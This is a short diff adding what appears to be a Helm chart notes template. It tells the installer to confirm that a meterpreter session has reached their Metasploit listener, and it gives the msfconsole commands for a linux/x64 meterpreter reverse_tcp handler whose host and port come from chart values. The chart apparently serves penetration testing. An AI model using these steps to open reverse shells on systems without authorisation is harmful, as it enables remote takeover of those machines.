@@ -1,0 +1,8 @@
+Make sure meterpreter connected to your Metasploit listener running at {{ .Values.lhost }}:{{ .Values.lport }}
+
+You can create a Metasploit listener with:
+
+use payload/linux/x64/meterpreter/reverse_tcp
+set LHOST {{ .Values.lhost }}
+set LPORT {{ .Values.lport }}
+to_handler
